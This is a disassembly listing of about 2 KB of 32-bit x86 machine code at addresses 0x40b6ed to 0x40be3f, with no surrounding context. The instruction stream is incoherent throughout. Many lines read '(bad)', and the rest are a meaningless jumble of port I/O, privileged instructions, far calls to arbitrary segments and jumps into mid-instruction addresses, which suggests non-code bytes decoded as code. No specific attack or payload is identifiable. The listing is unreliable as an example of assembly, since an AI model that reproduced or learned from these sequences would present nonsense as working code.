  40b6ed:	xor    eax,DWORD PTR [ebx-0x256da68]
  40b6f3:	addr16 mov ecx,0xe525df49
  40b6f9:	out    dx,al
  40b6fa:	xor    eax,0xd16953ee
  40b6ff:	dec    esi
  40b700:	xor    dh,0x1b
  40b703:	sub    ah,BYTE PTR [eax+ebx*4+0x17648e9d]
  40b70a:	inc    DWORD PTR [ebp-0x4c]
  40b70d:	push   edi
  40b70e:	test   BYTE PTR [ecx+esi*8+0x6c],dl
  40b712:	mov    edx,0xd301a899
  40b717:	test   BYTE PTR [ecx+esi*1-0x1d],al
  40b71b:	mov    DWORD PTR [edi],esp
  40b71d:	(bad)  
  40b71e:	xchg   edx,eax
  40b71f:	xor    edi,eax
  40b721:	(bad)  
  40b722:	pop    ebp
  40b723:	data16 fwait
  40b725:	sub    ch,BYTE PTR [edx]
  40b727:	into   
  40b728:	push   ebp
  40b729:	xchg   ecx,eax
  40b72a:	pop    ds
  40b72b:	mov    WORD PTR [edi],?
  40b72d:	int3   
  40b72e:	xchg   esi,eax
  40b72f:	imul   ecx,DWORD PTR [ebx+0x24],0x25d3e22c
  40b736:	arpl   WORD PTR [ecx+0x44],si
  40b739:	jle    0x40b73e
  40b73b:	aam    0xa5
  40b73d:	int    0xfa
  40b73f:	js     0x40b796
  40b741:	inc    esp
  40b742:	inc    ebp
  40b743:	xchg   BYTE PTR [esi-0x9],dl
  40b746:	bound  ebx,QWORD PTR [edi+0x1c]
  40b749:	in     eax,0x4e
  40b74b:	jno    0x40b6ce
  40b74d:	inc    ecx
  40b74e:	or     bl,BYTE PTR [ebp-0x56]
  40b751:	out    0xfd,eax
  40b753:	arpl   WORD PTR [ebx],bp
  40b755:	xchg   edi,eax
  40b756:	out    0x93,eax
  40b758:	pop    ss
  40b759:	lods   eax,DWORD PTR ds:[esi]
  40b75a:	mov    dh,0xa
  40b75c:	and    DWORD PTR [ebp+0x2d],ebx
  40b75f:	mov    esi,0xf0278f1b
  40b764:	fnsave [ecx+ecx*1]
  40b767:	in     al,0x9d
  40b769:	push   esp
  40b76a:	not    DWORD PTR [eax+ebx*2]
  40b76d:	cli    
  40b76e:	shr    BYTE PTR [eax+0x20],0x74
  40b772:	(bad)  
  40b774:	fisubr WORD PTR [edx+0x52b05931]
  40b77a:	je     0x40b77c
  40b77c:	fild   DWORD PTR [ebp-0x6ecf4d4c]
  40b782:	cld    
  40b783:	in     eax,dx
  40b784:	fidivr DWORD PTR ss:[ebx-0x7ff38e]
  40b78b:	cmp    BYTE PTR [eax],0x1a
  40b78e:	push   cs
  40b78f:	je     0x40b738
  40b791:	test   eax,0x759affb
  40b796:	xchg   esp,eax
  40b797:	inc    esi
  40b798:	jmp    0x40b7c0
  40b79a:	ret    
  40b79b:	clc    
  40b79c:	and    DWORD PTR [ebx-0x3549dfa2],esi
  40b7a2:	push   cs
  40b7a3:	push   0x44
  40b7a5:	xor    DWORD PTR [ebx-0x5b],0xad476c33
  40b7ac:	out    dx,eax
  40b7ad:	jmp    0x40b7ba
  40b7af:	and    cl,BYTE PTR [ebx-0x4c]
  40b7b2:	push   esp
  40b7b3:	mov    cs,esp
  40b7b5:	sbb    al,0xeb
  40b7b7:	or     DWORD PTR [eax-0xf],ecx
  40b7ba:	jl     0x40b740
  40b7bc:	sub    eax,0x3707fa0
  40b7c1:	or     cl,cl
  40b7c3:	mov    BYTE PTR [ecx-0x41],dl
  40b7c6:	lods   al,BYTE PTR ds:[esi]
  40b7c7:	(bad)
  40b7cc:	adc    esi,0xffffff85
  40b7cf:	jge    0x40b774
  40b7d1:	in     al,dx
  40b7d2:	lods   eax,DWORD PTR ds:[esi]
  40b7d3:	sub    eax,0x66821b7b
  40b7d8:	daa    
  40b7d9:	push   0x3a65fcca
  40b7de:	retf   0xb6d1
  40b7e1:	jg     0x40b76b
  40b7e3:	xchg   edx,eax
  40b7e4:	sub    al,0x17
  40b7e6:	fwait
  40b7e7:	rcr    BYTE PTR [eax+edi*1],1
  40b7ea:	stos   DWORD PTR es:[edi],eax
  40b7eb:	cmp    ch,al
  40b7ed:	or     BYTE PTR [eax],dh
  40b7ef:	pushf  
  40b7f0:	or     bl,BYTE PTR [eax]
  40b7f2:	aam    0x58
  40b7f4:	push   ss
  40b7f5:	xor    al,0x9d
  40b7f7:	and    edx,DWORD PTR [ecx-0x42]
  40b7fa:	stc    
  40b7fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7fc:	shl    DWORD PTR [eax-0x6a803129],cl
  40b802:	sub    DWORD PTR [ebx-0x1c6e4d1e],esp
  40b808:	jnp    0x40b7a3
  40b80a:	cmp    esp,esp
  40b80c:	in     al,dx
  40b80d:	jle    0x40b87f
  40b80f:	mov    eax,ds:0x700df031
  40b814:	push   0xffffffed
  40b816:	mov    edx,0x8504d163
  40b81b:	jno    0x40b7a7
  40b81d:	push   esi
  40b81e:	and    ebx,DWORD PTR [edx+0x11]
  40b821:	in     al,dx
  40b822:	mov    esi,ecx
  40b824:	jns    0x40b805
  40b826:	std    
  40b827:	ins    DWORD PTR es:[edi],dx
  40b828:	mov    eax,ds:0xda51bf31
  40b82d:	stos   DWORD PTR es:[edi],eax
  40b82e:	push   esp
  40b82f:	pop    ds
  40b830:	scas   al,BYTE PTR es:[edi]
  40b831:	shr    BYTE PTR [edx-0x7e],0xd3
  40b835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b836:	or     eax,DWORD PTR [edx]
  40b838:	xchg   ecx,eax
  40b839:	outs   dx,BYTE PTR ds:[esi]
  40b83a:	leave  
  40b83b:	les    esi,FWORD PTR [ecx+0xf]
  40b83e:	dec    edx
  40b83f:	pusha  
  40b840:	adc    ah,BYTE PTR [ecx-0x7c642bfa]
  40b846:	pop    esp
  40b847:	cmp    ch,BYTE PTR [edi]
  40b849:	mov    ch,dl
  40b84b:	mov    esi,0x6b9bb137
  40b850:	fnsave [ecx+0x6c]
  40b853:	cmp    bh,ah
  40b855:	call   FWORD PTR [eax]
  40b857:	shr    DWORD PTR [edx+0x3],1
  40b85a:	inc    ebp
  40b85b:	fild   WORD PTR [esi+0x2c32152e]
  40b861:	shl    BYTE PTR [eax+0x61],1
  40b864:	adc    BYTE PTR [edx-0x4de73e1],bl
  40b86a:	cmp    eax,0x394d1b5e
  40b86f:	pop    esp
  40b870:	or     ch,BYTE PTR [esi+0x2abcaf23]
  40b876:	inc    esi
  40b877:	imul   ebx,DWORD PTR gs:0x83d79a26,0x60
  40b87f:	loopne 0x40b863
  40b881:	sub    bh,BYTE PTR [ebx-0x7f4b300]
  40b887:	cmp    BYTE PTR [edi],ah
  40b889:	(bad)  
  40b88b:	cmc    
  40b88c:	cmp    al,0x55
  40b88e:	mov    WORD PTR [eax+ebx*8],?
  40b891:	ror    DWORD PTR [ebp+0x4dca399b],0x81
  40b898:	adc    cl,bl
  40b89a:	rcl    bl,cl
  40b89c:	mov    al,0xad
  40b89e:	adc    dl,dh
  40b8a0:	daa    
  40b8a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8a2:	aaa    
  40b8a3:	sbb    al,0x4c
  40b8a5:	add    eax,0x3ac70601
  40b8aa:	and    ebp,DWORD PTR [ebp+0x36a895bf]
  40b8b0:	mov    cl,0x3b
  40b8b2:	aam    0xee
  40b8b4:	scas   eax,DWORD PTR es:[edi]
  40b8b5:	and    edx,DWORD PTR [ebx+0x23]
  40b8b8:	lahf   
  40b8b9:	dec    edx
  40b8ba:	push   0xee2cd7a2
  40b8bf:	test   BYTE PTR [edi+edx*4],bh
  40b8c2:	push   esp
  40b8c3:	pushf  
  40b8c4:	out    dx,eax
  40b8c5:	add    eax,0x2c472d80
  40b8ca:	aas    
  40b8cb:	mov    bh,bl
  40b8cd:	jnp    0x40b87c
  40b8cf:	mov    ebp,0x3136e6aa
  40b8d4:	inc    ecx
  40b8d5:	and    eax,0xfaca9226
  40b8da:	mov    eax,ds:0xdc728710
  40b8df:	mov    ah,0x5e
  40b8e1:	fbld   TBYTE PTR [eax]
  40b8e3:	cmp    dh,ah
  40b8e5:	xor    eax,0xcee4957d
  40b8ea:	xor    BYTE PTR [esp+eiz*8-0x70],bl
  40b8ee:	xchg   ecx,eax
  40b8ef:	mov    esp,0x5f57d3a2
  40b8f4:	xor    al,0x36
  40b8f6:	jbe    0x40b8f4
  40b8f8:	sub    al,0x58
  40b8fa:	dec    esi
  40b8fb:	pop    ebx
  40b8fc:	mov    eax,0x1827747d
  40b901:	repnz jecxz 0x40b88e
  40b904:	bound  esp,QWORD PTR [esi+0x2a]
  40b907:	aas    
  40b908:	sub    al,0x95
  40b90a:	call   0x1d73ba89
  40b90f:	cmc    
  40b910:	mov    al,ds:0x9740452a
  40b915:	sbb    BYTE PTR [edx+0x7],bl
  40b918:	pop    esp
  40b919:	push   ss
  40b91a:	shr    DWORD PTR [edx-0x41],1
  40b91d:	sbb    eax,0x7577afde
  40b922:	inc    ecx
  40b923:	and    al,0xb6
  40b925:	sbb    bh,dh
  40b927:	inc    eax
  40b928:	push   0xffffffce
  40b92a:	dec    edx
  40b92b:	ror    BYTE PTR [esi+ebx*8+0x6bd45c4a],cl
  40b932:	enter  0xad6a,0x33
  40b936:	cmp    DWORD PTR [eax-0x48c65bb4],esp
  40b93c:	jmp    0xb7c644f
  40b941:	lods   al,BYTE PTR ds:[esi]
  40b942:	lock repnz addr16 mov ebx,0x1abe5b78
  40b94a:	scas   al,BYTE PTR es:[edi]
  40b94b:	mov    edx,0xe71aec7
  40b950:	lods   eax,DWORD PTR ds:[esi]
  40b951:	push   eax
  40b952:	push   ebx
  40b953:	prefetch (bad)
  40b954:	or     eax,0x9ae47dda
  40b959:	inc    esi
  40b95a:	push   edi
  40b95b:	push   ebx
  40b95c:	pmulhuw mm5,QWORD PTR [esi-0x3b32b59c]
  40b963:	addr16 mov esi,0x7e404202
  40b969:	sub    eax,DWORD PTR [edx-0x18]
  40b96c:	sbb    BYTE PTR [ebp-0x4a99c12d],ah
  40b972:	adc    DWORD PTR [edx],edx
  40b974:	or     DWORD PTR [esi+ebx*8],eax
  40b977:	mov    ch,0x37
  40b979:	xchg   edx,eax
  40b97a:	inc    eax
  40b97b:	push   edi
  40b97c:	cmp    al,dh
  40b97e:	dec    edi
  40b97f:	pop    esp
  40b980:	rcr    BYTE PTR [ebx],cl
  40b982:	pop    esi
  40b983:	hlt    
  40b984:	lahf   
  40b985:	push   0xffffffd4
  40b987:	adc    DWORD PTR [ebx-0x79],edi
  40b98a:	shl    BYTE PTR [esi],cl
  40b98c:	sub    DWORD PTR [ebp+0x51],esp
  40b98f:	js     0x40b9f4
  40b991:	jle    0x40b951
  40b993:	sbb    al,0x96
  40b995:	pmaddwd mm5,QWORD PTR [ebx+0x54]
  40b999:	ins    DWORD PTR es:[edi],dx
  40b99a:	fiadd  WORD PTR [edx-0x6fdbbe68]
  40b9a0:	mov    DWORD PTR [edi],0x1667bcd7
  40b9a6:	sbb    DWORD PTR [ebp+0x50],0x5d9f0515
  40b9ad:	mov    ds:0x1c2129e2,eax
  40b9b2:	dec    ecx
  40b9b3:	adc    DWORD PTR [ecx],0x9930a90d
  40b9b9:	adc    eax,0xddbb3c14
  40b9be:	xor    ch,cl
  40b9c0:	fdiv   DWORD PTR [ebp-0x68985eae]
  40b9c6:	enter  0xb69,0x37
  40b9ca:	add    BYTE PTR [ebx+0x45fd12e7],cl
  40b9d0:	push   ecx
  40b9d1:	push   edx
  40b9d2:	jne    0x40ba30
  40b9d4:	and    DWORD PTR [ecx+0x36],ebx
  40b9d7:	icebp  
  40b9d8:	pop    esi
  40b9d9:	add    eax,edi
  40b9db:	(bad)  
  40b9dc:	xor    eax,0xeace5921
  40b9e1:	aad    0x4f
  40b9e3:	sub    al,BYTE PTR [eax*2+0x5270af9e]
  40b9ea:	xchg   edi,eax
  40b9eb:	push   eax
  40b9ec:	mov    WORD PTR [ecx],cs
  40b9ee:	cld    
  40b9ef:	pop    es
  40b9f0:	fisub  DWORD PTR [ecx]
  40b9f2:	sahf   
  40b9f3:	sbb    dh,BYTE PTR [eax+edx*4-0xf]
  40b9f7:	jg     0x40ba5f
  40b9f9:	call   0x29c0:0x37718e7d
  40ba00:	int3   
  40ba01:	data16 adc BYTE PTR [esi],dl
  40ba04:	and    DWORD PTR [ebx],esp
  40ba06:	pusha  
  40ba07:	out    0x8,eax
  40ba09:	gs pop esp
  40ba0b:	and    BYTE PTR [eax+0x6446f810],al
  40ba11:	push   ds
  40ba12:	xchg   edx,eax
  40ba13:	ret    
  40ba14:	lahf   
  40ba15:	mov    ebx,0xd678145
  40ba1a:	mov    al,ds:0x384b6609
  40ba1f:	jl     0x40ba6a
  40ba21:	dec    eax
  40ba22:	mov    ecx,0x5d7297ae
  40ba27:	adc    eax,0x6555dcff
  40ba2c:	shr    DWORD PTR [ebx],cl
  40ba2e:	leave  
  40ba2f:	out    0xc0,al
  40ba31:	dec    esp
  40ba32:	out    dx,al
  40ba33:	mov    cl,0xed
  40ba35:	mov    esi,0xa5d0a21f
  40ba3a:	add    al,bh
  40ba3c:	(bad)  
  40ba3d:	push   eax
  40ba3e:	xor    ah,ah
  40ba40:	xchg   BYTE PTR [eax],bl
  40ba42:	sbb    dh,bh
  40ba44:	dec    ecx
  40ba45:	push   esp
  40ba46:	jge    0x40ba96
  40ba48:	inc    edi
  40ba49:	add    eax,DWORD PTR fs:[edx+0x23]
  40ba4d:	push   0xd8f1f628
  40ba52:	add    DWORD PTR [ebx],eax
  40ba54:	mov    dl,0xc6
  40ba56:	retf   
  40ba57:	arpl   bp,cx
  40ba59:	push   ss
  40ba5a:	mov    ch,BYTE PTR ds:0x154cfef2
  40ba60:	xchg   BYTE PTR [ecx+eiz*1],dh
  40ba63:	scas   eax,DWORD PTR es:[edi]
  40ba64:	cmp    al,0x76
  40ba66:	call   0xb81d:0x7026f02c
  40ba6d:	jnp    0x40ba7b
  40ba6f:	hlt    
  40ba70:	dec    ecx
  40ba71:	cmc    
  40ba72:	mov    eax,ds:0x731e4a13
  40ba77:	mov    dl,0x9
  40ba79:	lock stos DWORD PTR es:[edi],eax
  40ba7b:	jp     0x40ba7c
  40ba7d:	fdivr  QWORD PTR [ecx+0x5159650f]
  40ba83:	in     eax,0xba
  40ba85:	mov    esp,0x7b74d12
  40ba8a:	jecxz  0x40bafc
  40ba8c:	int3   
  40ba8d:	sbb    al,0x28
  40ba8f:	sbb    eax,0xe9e6a234
  40ba94:	pop    ecx
  40ba95:	pop    ecx
  40ba96:	xchg   BYTE PTR [edi],bh
  40ba98:	mov    ch,0x68
  40ba9a:	xchg   ecx,eax
  40ba9b:	bound  edx,QWORD PTR [ebp+edx*4+0x58]
  40ba9f:	sub    edi,ebx
  40baa1:	enter  0xaca3,0xff
  40baa5:	push   eax
  40baa6:	xor    DWORD PTR [ebp-0xb03b97a],0x56
  40baad:	push   ds
  40baae:	sub    eax,0x23a212cf
  40bab3:	cdq    
  40bab4:	out    dx,eax
  40bab5:	fsubr  QWORD PTR [edx-0x48589df3]
  40babb:	and    ah,al
  40babd:	mov    dl,0xdf
  40babf:	inc    ecx
  40bac0:	scas   al,BYTE PTR es:[edi]
  40bac1:	sbb    al,0x41
  40bac3:	xchg   esp,eax
  40bac4:	sbb    eax,0x51209798
  40bac9:	push   cs
  40baca:	gs je  0x40ba7b
  40bacd:	sub    eax,0x8f6e55c0
  40bad2:	xor    bh,ah
  40bad4:	(bad)  
  40bad5:	xor    DWORD PTR [ecx+esi*2],edx
  40bad8:	dec    edx
  40bad9:	icebp  
  40bada:	xchg   edi,eax
  40badb:	mov    ds,WORD PTR [esi-0x22]
  40bade:	pop    ebp
  40badf:	outs   dx,DWORD PTR ds:[esi]
  40bae0:	push   esi
  40bae1:	data16 sbb ah,BYTE PTR [edx]
  40bae4:	push   esi
  40bae5:	lds    ebp,FWORD PTR [ebp+0x77f5a6cc]
  40baeb:	sub    al,0xee
  40baed:	inc    ebp
  40baee:	sbb    eax,0xbcebd2d
  40baf3:	iret   
  40baf4:	scas   eax,DWORD PTR es:[edi]
  40baf5:	repz and DWORD PTR [ebp-0x75],0xffffffc8
  40bafa:	mov    edx,0x7b2e1b84
  40baff:	dec    edi
  40bb00:	lods   eax,DWORD PTR ds:[esi]
  40bb01:	inc    esi
  40bb02:	(bad)  
  40bb03:	out    dx,eax
  40bb04:	shrd   ebx,edi,0x81
  40bb08:	jmp    DWORD PTR [edx-0x1e9b387c]
  40bb0e:	jmp    0xe9b3:0xf06d4046
  40bb15:	dec    esp
  40bb16:	xchg   edx,eax
  40bb17:	not    BYTE PTR [esi+0x2993634f]
  40bb1d:	loope  0x40bb1b
  40bb1f:	push   es
  40bb20:	test   eax,0x4a476b8c
  40bb25:	icebp  
  40bb26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb27:	inc    eax
  40bb28:	jmp    FWORD PTR [ebx-0x216fa8a5]
  40bb2e:	outs   dx,DWORD PTR ds:[esi]
  40bb2f:	outs   dx,DWORD PTR ds:[esi]
  40bb30:	push   ss
  40bb31:	jmp    0x40bb39
  40bb33:	cmc    
  40bb34:	popf   
  40bb35:	dec    ebx
  40bb36:	mov    ah,0x89
  40bb38:	imul   eax,ebx,0x24
  40bb3b:	adc    DWORD PTR [esi-0x2bb26826],ecx
  40bb41:	sbb    BYTE PTR [edx],bh
  40bb43:	mov    cl,dl
  40bb45:	sbb    ebx,DWORD PTR [esi+0x38]
  40bb48:	shl    al,cl
  40bb4a:	jge    0x40bb55
  40bb4c:	xor    BYTE PTR [esi-0x54ee8fc1],0xc9
  40bb53:	les    ebp,FWORD PTR [esi+0x971bb77]
  40bb59:	pop    eax
  40bb5a:	push   esi
  40bb5b:	dec    ebp
  40bb5c:	pushf  
  40bb5d:	pop    eax
  40bb5f:	pop    edi
  40bb60:	aas    
  40bb61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb62:	ins    BYTE PTR es:[edi],dx
  40bb63:	pop    ebx
  40bb64:	ud1    ebp,DWORD PTR es:[edx]
  40bb68:	mov    BYTE PTR ds:0xf2888326,ch
  40bb6e:	and    DWORD PTR [eax],eax
  40bb70:	mov    DWORD PTR es:[edi-0x33c7dfaf],ecx
  40bb77:	mov    bl,0xdf
  40bb79:	jp     0x40bafd
  40bb7b:	mov    ebx,edx
  40bb7d:	inc    edx
  40bb7e:	xor    eax,0xb9d2f7a8
  40bb83:	inc    esp
  40bb84:	pop    es
  40bb85:	shl    al,cl
  40bb87:	jge    0x40bbf8
  40bb89:	mov    ss,eax
  40bb8b:	in     al,0x93
  40bb8d:	out    0xe5,eax
  40bb8f:	and    dh,BYTE PTR [ebx-0x2d]
  40bb92:	or     BYTE PTR [ecx+0xc34294c],0x4f
  40bb99:	push   es
  40bb9a:	pop    ecx
  40bb9b:	data16 mov cs,WORD PTR [edi]
  40bb9e:	(bad)  
  40bb9f:	push   ss
  40bba0:	and    al,bh
  40bba2:	into   
  40bba3:	xchg   esp,eax
  40bba4:	icebp  
  40bba5:	mov    eax,0x21400475
  40bbaa:	loop   0x40bbd5
  40bbac:	outs   dx,DWORD PTR ds:[esi]
  40bbad:	loopne 0x40bb5e
  40bbaf:	leave  
  40bbb0:	not    BYTE PTR [esi-0x643db22e]
  40bbb6:	fwait
  40bbb7:	jne    0x40bbe5
  40bbb9:	hlt    
  40bbba:	adc    DWORD PTR [edi+0x139047d8],ecx
  40bbc0:	push   ss
  40bbc1:	loope  0x40bc2a
  40bbc3:	xor    al,0x27
  40bbc5:	xor    DWORD PTR ds:0xeac7ac12,esi
  40bbcb:	les    edx,FWORD PTR [esi]
  40bbcd:	repz sbb DWORD PTR [ebp-0x452b51df],ebp
  40bbd4:	lea    ecx,[ecx+0x6e]
  40bbd7:	or     edx,0x98eed040
  40bbdd:	aam    0x89
  40bbdf:	push   cs
  40bbe0:	and    ecx,DWORD PTR [edi+esi*1+0x4c096c5b]
  40bbe7:	xlat   BYTE PTR ds:[ebx]
  40bbe8:	in     al,dx
  40bbe9:	jmp    0x50dc4f49
  40bbee:	push   ecx
  40bbef:	das    
  40bbf0:	lock inc ecx
  40bbf2:	or     BYTE PTR [edx-0x13a0f2cd],0x1d
  40bbf9:	mov    ebp,0xa1462152
  40bbfe:	repnz or BYTE PTR [ebx],ah
  40bc01:	(bad)  
  40bc02:	mov    edx,0x1187f60c
  40bc07:	(bad)  
  40bc08:	jg     0x40bbf4
  40bc0a:	ret    0x8c43
  40bc0d:	in     al,dx
  40bc0e:	popf   
  40bc0f:	pop    ebp
  40bc10:	popa   
  40bc11:	in     eax,dx
  40bc12:	lea    eax,[edx+0x43e47800]
  40bc18:	xchg   edx,eax
  40bc19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc1a:	push   cs
  40bc1b:	push   eax
  40bc1c:	dec    ebp
  40bc1d:	lds    ecx,FWORD PTR [ecx+0x5e4cf2]
  40bc23:	in     eax,dx
  40bc24:	jmp    FWORD PTR [esp+ecx*4]
  40bc27:	lods   al,BYTE PTR ds:[esi]
  40bc28:	sub    al,0x77
  40bc2a:	push   ss
  40bc2b:	jg     0x40bc28
  40bc2d:	xchg   esp,eax
  40bc2e:	stc    
  40bc2f:	cmp    bh,ch
  40bc31:	cmp    eax,0x6067af9e
  40bc36:	dec    esp
  40bc37:	daa    
  40bc38:	iret   
  40bc39:	push   ebx
  40bc3a:	add    esi,DWORD PTR [edi]
  40bc3c:	je     0x40bc23
  40bc3e:	pop    eax
  40bc3f:	adc    esp,0x10c8959f
  40bc45:	shl    BYTE PTR [esi+0x71],0xfe
  40bc49:	(bad)  
  40bc4a:	fadd   QWORD PTR [edx-0x66]
  40bc4d:	sbb    eax,0xecf16c46
  40bc52:	pop    edx
  40bc53:	aam    0x99
  40bc55:	xchg   ecx,eax
  40bc56:	cmc    
  40bc57:	(bad)  
  40bc58:	and    ecx,DWORD PTR [eax]
  40bc5a:	imul   ebp,eax,0x5983281f
  40bc60:	pop    ecx
  40bc61:	cs dec ebx
  40bc63:	test   BYTE PTR [edi-0x58],al
  40bc66:	into   
  40bc67:	fst    DWORD PTR ds:[edi]
  40bc6a:	(bad)
  40bc6e:	test   DWORD PTR [ebx-0x48],ebx
  40bc71:	mov    edi,0xa0aac992
  40bc76:	jne    0x40bc59
  40bc78:	jmp    0x9d66e467
  40bc7d:	or     al,0x77
  40bc7f:	mov    cl,0x5b
  40bc81:	adc    DWORD PTR [edi-0x61],ebp
  40bc84:	jp     0x40bc67
  40bc86:	adc    ecx,DWORD PTR [ebp+0x6a]
  40bc89:	dec    esi
  40bc8a:	(bad)  
  40bc8b:	call   0x8b7f:0x4363992a
  40bc92:	pop    es
  40bc93:	mov    ecx,0xc20427f2
  40bc98:	test   DWORD PTR [ecx+0x14eff1cb],esp
  40bc9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc9f:	test   ecx,ecx
  40bca1:	xchg   BYTE PTR [eax],bl
  40bca3:	ins    BYTE PTR es:[edi],dx
  40bca4:	gs mov edi,0x19a8b937
  40bcaa:	xlat   BYTE PTR ds:[ebx]
  40bcab:	lds    edi,FWORD PTR [ecx+0x4b]
  40bcae:	call   0x9b92a503
  40bcb3:	xchg   esp,eax
  40bcb4:	jne    0x40bcdd
  40bcb6:	pop    edx
  40bcb7:	xor    DWORD PTR [ecx-0x3e],eax
  40bcba:	mov    BYTE PTR [bp+si+0x37],bl
  40bcbe:	push   esi
  40bcbf:	int3   
  40bcc0:	int3   
  40bcc1:	inc    esp
  40bcc2:	or     BYTE PTR [esi+0x7290f767],bl
  40bcc8:	out    0x1d,eax
  40bcca:	inc    ebp
  40bccb:	push   ecx
  40bccc:	inc    ebp
  40bccd:	cmp    BYTE PTR [edx-0x69],bl
  40bcd0:	dec    ecx
  40bcd1:	xor    dl,BYTE PTR [eax]
  40bcd3:	rol    DWORD PTR [edi],cl
  40bcd5:	int    0xc2
  40bcd7:	cld    
  40bcd8:	xchg   ecx,eax
  40bcd9:	add    eax,edi
  40bcdb:	cmp    DWORD PTR [ebp-0x71927944],esi
  40bce1:	mov    ebx,0x295ea00a
  40bce6:	inc    ecx
  40bce7:	xchg   edi,eax
  40bce8:	add    al,0x47
  40bcea:	sbb    ecx,0xb0708ffe
  40bcf0:	inc    edx
  40bcf1:	lock aaa 
  40bcf3:	scas   al,BYTE PTR es:[edi]
  40bcf4:	xchg   esi,eax
  40bcf5:	rcr    DWORD PTR [ebp+esi*8+0x8],1
  40bcf9:	call   0x69366d9f
  40bcfe:	imul   edi,edx,0xffffff9d
  40bd01:	jmp    0x40bd6e
  40bd03:	add    dl,BYTE PTR [edi]
  40bd05:	cmc    
  40bd06:	lea    edx,[edx+0x7ae8ec61]
  40bd0c:	retf   0xf9f7
  40bd0f:	or     ebx,edx
  40bd11:	pusha  
  40bd12:	out    0xde,eax
  40bd14:	add    bh,ah
  40bd16:	std    
  40bd17:	pop    es
  40bd18:	(bad)  
  40bd1a:	test   al,0x9c
  40bd1c:	and    BYTE PTR [esi],ah
  40bd1e:	mov    eax,0x735a73ec
  40bd23:	or     ebx,DWORD PTR [ebp+0x3]
  40bd26:	stos   BYTE PTR es:[edi],al
  40bd27:	(bad)  
  40bd28:	mov    gs,eax
  40bd2a:	icebp  
  40bd2b:	sub    al,0x34
  40bd2d:	inc    esi
  40bd2e:	mov    bl,0xe5
  40bd30:	inc    ecx
  40bd31:	xor    edi,esi
  40bd33:	(bad)  
  40bd34:	jo     0x40bcca
  40bd36:	jo     0x40bd26
  40bd38:	mov    ss,WORD PTR [ecx-0x57]
  40bd3b:	in     al,0xe
  40bd3d:	(bad)  
  40bd3e:	mov    al,ds:0xfab3bdf0
  40bd43:	dec    DWORD PTR [edi-0x69]
  40bd46:	aaa    
  40bd47:	retf   
  40bd48:	loope  0x40bcf1
  40bd4a:	xor    eax,0xfd251777
  40bd4f:	mov    cl,0x54
  40bd51:	shl    DWORD PTR [eax-0x3f8a8c38],1
  40bd57:	xchg   ebp,eax
  40bd58:	push   edx
  40bd59:	inc    ecx
  40bd5a:	ret    0x9139
  40bd5d:	inc    ecx
  40bd5e:	cmc    
  40bd5f:	sbb    edx,DWORD PTR [edi+0x736e9774]
  40bd65:	cmp    al,0xb7
  40bd67:	out    dx,al
  40bd68:	push   ecx
  40bd69:	retf   
  40bd6a:	(bad)  
  40bd6c:	mov    dh,0xe2
  40bd6e:	xchg   edx,eax
  40bd6f:	cmp    bl,BYTE PTR [edi-0x15]
  40bd72:	js     0x40bd9f
  40bd74:	jp     0x40bde0
  40bd76:	bound  ecx,QWORD PTR ds:0x61debe1
  40bd7c:	fsubr  DWORD PTR [esp+edx*4+0x22]
  40bd80:	add    edi,ebx
  40bd82:	or     ebp,DWORD PTR ds:0xbfd19a00
  40bd88:	fdiv   QWORD PTR [eax]
  40bd8a:	jnp    0x40bdac
  40bd8c:	outs   dx,BYTE PTR ds:[esi]
  40bd8d:	lods   al,BYTE PTR ds:[esi]
  40bd8e:	mov    bl,0x5f
  40bd90:	aaa    
  40bd91:	mov    edx,0xa8bb0fee
  40bd96:	sub    edi,DWORD PTR [ebx+0x43]
  40bd99:	add    esp,DWORD PTR [edi+esi*2-0x38]
  40bd9d:	xor    al,BYTE PTR [eax-0x6f8148cf]
  40bda3:	adc    al,0xa3
  40bda5:	push   ds
  40bda6:	pushf  
  40bda7:	dec    edx
  40bda8:	mov    dh,0xcb
  40bdaa:	pop    esi
  40bdab:	jo     0x40bd6a
  40bdad:	or     dl,BYTE PTR [ebp+ebp*1+0xb]
  40bdb1:	sti    
  40bdb2:	ret    
  40bdb3:	js     0x40bdd5
  40bdb5:	xchg   esi,eax
  40bdb6:	sar    ch,cl
  40bdb8:	std    
  40bdb9:	mov    esp,DWORD PTR cs:[edi]
  40bdbc:	cmp    DWORD PTR [edx+0x3d],ebx
  40bdbf:	test   eax,0x30eea7ce
  40bdc4:	xchg   edi,eax
  40bdc5:	outs   dx,BYTE PTR ds:[esi]
  40bdc6:	rcr    BYTE PTR [ecx-0x33],0xd9
  40bdca:	(bad)  
  40bdcc:	jecxz  0x40bdc0
  40bdce:	dec    ebx
  40bdcf:	test   DWORD PTR [eax*8+0x59900980],edi
  40bdd6:	bound  esp,QWORD PTR ss:[edi+0xed5f1d5]
  40bddd:	fwait
  40bdde:	call   DWORD PTR [ebp+eiz*2-0x14338180]
  40bde5:	je     0x40bd85
  40bde7:	push   edx
  40bde8:	pop    esi
  40bde9:	pop    es
  40bdea:	pop    ebx
  40bdeb:	pop    es
  40bdec:	mov    al,ds:0xe835470f
  40bdf1:	fucomi st,st(3)
  40bdf3:	push   ebx
  40bdf4:	lahf   
  40bdf5:	aaa    
  40bdf6:	test   al,0xc1
  40bdf8:	jb     0x40be5e
  40bdfa:	shl    DWORD PTR [edi+ebp*4+0x783989fe],1
  40be01:	mov    BYTE PTR [ecx-0xc3d1226],al
  40be07:	cmp    al,0xb4
  40be09:	mov    eax,ds:0xd9034051
  40be0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be0f:	sub    eax,0xc68c99d6
  40be14:	add    al,0x15
  40be16:	out    0x2a,al
  40be18:	dec    ebx
  40be19:	out    0x4b,al
  40be1b:	cmp    BYTE PTR [ebp-0x72b2a2ed],cl
  40be21:	xchg   edx,eax
  40be22:	dec    esp
  40be23:	js     0x40be4e
  40be25:	cmp    al,0xdb
  40be27:	sub    al,0x92
  40be29:	test   DWORD PTR [edi+0x3e],ecx
  40be2c:	call   0x783f:0x9887854a
  40be33:	xchg   ebx,eax
  40be34:	pop    es
  40be35:	aad    0x21
  40be37:	or     eax,0xddceb228
  40be3c:	sub    al,0x9b
  40be3e:	(bad)  
  40be3f:	icebp  
